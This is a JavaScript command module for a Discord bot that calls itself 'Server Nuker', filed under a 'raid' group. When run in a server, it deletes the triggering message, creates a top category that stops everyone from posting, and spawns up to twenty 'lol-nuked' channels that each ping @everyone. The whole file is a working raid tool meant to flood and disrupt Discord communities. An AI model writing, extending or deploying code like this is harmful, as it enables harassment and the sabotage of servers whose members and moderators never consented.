const Commando = require('discord.js-commando')
const Discord = require('discord.js')

module.exports = class TextChannelCommand extends Commando.Command{
    constructor(client) {
        super(client, {
            name: 'textchannel',
            memberName: 'textchannel',
            group: 'raid',
            description: 'Spams text channels',
            argsType: 'multiple',
            guildOnly: true,
            throttling:{
                usages:1,
                duration:5
            }
        })
    }

    async run(message, args){
        message.delete()
        
        const noNumEmbed = new Discord.MessageEmbed()
            .setAuthor('Spam Roles Command')
            .setFooter('Server Nuker v2.0.0 [BETA]', 'https://i.imgur.com/BCDIf5E.jpg')
            .setDescription('Error! Enter a valid number for the count\n`.spamroles <count> | .spamroles 3`')
            .setColor('#ff0000')
        if(!args[0] || typeof(parseFloat(args[0])) !== 'number'){
            message.channel.send(noNumEmbed)
            return
        }

        var count = Math.round(args[0])

        if(count > 20){
            count = 20
        }

        let categoryId = ''
        message.guild.channels.create('| 💣 | SERVER NUKER', {type: 'category'}).then(channel => {
            channel.setPosition(0)
            categoryId = channel.id
            channel.overwritePermissions([
                {
                    id: message.guild.id,
                    deny: ['SEND_MESSAGES'],
                    allow: ['ADD_REACTIONS', 'READ_MESSAGE_HISTORY', 'VIEW_CHANNEL']
                }
            ])
        })

        for(let i=1; i<=count; i++){
            setTimeout(() => {
                message.guild.channels.create('lol-nuked', {
                    type: 'text',
                    parent: categoryId,
                    topic: 'Epic nuker bot'
                }).then(channel => {
                    channel.send(`||@everyone||\nU r nuked 💣💣💣!`)
                })
            }, 1000)
        }

        const moment = require('moment')
        const time = moment().format("HH:mm:ss a")
        console.log(`${time} | Command Ran: spamtextchannel`)
    }
}